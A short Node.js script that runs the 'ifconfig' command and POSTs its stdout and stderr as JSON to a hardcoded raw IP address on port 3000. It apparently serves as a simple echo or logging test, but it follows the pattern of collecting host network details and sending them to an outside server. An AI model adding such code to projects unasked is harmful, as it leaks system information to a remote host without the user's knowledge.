// This class makes a get request down to a server.
// Sending out the stdout of a command.

var exec = require('child_process').exec;
var request = require('request');

var host = "198.23.255.114";
var port = "3000";

// This returns the url to send to.
// It adds in the methodToCall at the end of it.
var getURLToSendTo = function(methodToCall) {
    var url = "http://" + host + ":" + port +  "/echo/" + methodToCall;
    return url;
};

var doPost = function(data) {
    request.post(
    getURLToSendTo('console'),
    { json : data }, 
    function (error, response, body) {
        if (error){
            console.log("Error when sending to " + getURLToSendTo('console'));
            console.log(error);
        }
        else{
            console.log("Successfully sent a POST request.");
            console.log(body);
        } 
    });
};

var command = "ifconfig";
exec(command, function(err, stdout, stderr){
    console.log(stdout);
    var output = {"stdout":stdout, "stderr":stderr};
    doPost(output);
});